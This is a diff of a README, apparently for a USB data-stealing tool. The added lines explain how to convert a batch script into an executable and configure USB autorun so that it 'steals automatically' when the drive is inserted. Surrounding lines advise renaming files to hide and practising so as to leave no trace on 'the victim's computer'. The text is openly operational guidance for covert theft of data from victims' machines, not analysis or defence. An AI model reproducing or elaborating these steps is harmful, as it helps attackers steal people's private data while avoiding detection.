@@ -26,9 +26,13 @@ _(At the top of the 2 programs will have a save option, click on it and choose y
 
 <br />
 
-*If you want to change the name of these files to hide yourself, you will have to open all the documents and leave the name of it the same as what you changed.*
+**TURNING INTO AUTORUN, TO STEAL AUTOMATICALLY WHEN PLACED:**
+<br />
+To make the .bat file run automatically you need to transform it into .exe, we will use the program "Bat To Exe" that I left in the repository (or if you want to access the download on the official website, I left it in the "main credit"). after you have transformed launch.bat into launch.exe, we will install another program that will make the .exe file run automatically when the usb card is placed which is called "Sam Logic USB Auto Run Creator" so after installing, select launch.exe to automatically open and select the location on the card from a few files it will create to make the usb card usable automatically
 
-*I made a repository explaining how to automatically steal data just by putting the usb drive, without opening anything, this is the link:*
+<br />
+
+*If you want to change the name of these files to hide yourself, you will have to open all the documents and leave the name of it the same as what you changed.*
 
 *Before performing this process on someone's computer, test this method on your computer until you actually learn how it works, otherwise you run the risk of not working or in the worst case leaving a trace that you were copying data from the victim's computer to their computer.*
 
